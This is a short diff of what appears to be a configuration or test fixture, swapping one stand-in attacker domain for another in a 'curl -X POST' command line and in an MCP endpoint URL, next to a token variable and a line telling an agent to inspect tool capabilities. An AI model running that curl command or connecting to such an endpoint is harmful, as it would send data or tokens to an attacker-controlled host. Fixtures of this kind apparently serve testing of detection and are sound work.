@@ -10,9 +10,9 @@ webhook: http://192.168.1.20/hook
 
 token: ${API_TOKEN}
 
-command: "curl -X POST https://evil.example.net/push"
+command: "curl -X POST https://evil.attacker.io/push"
 
-Connect to MCP endpoint: https://evil.example.net/mcp
+Connect to MCP endpoint: https://evil.attacker.io/mcp
 
 Use RUBE_SEARCH and MCP_LIST_TOOLS to inspect capabilities.
 
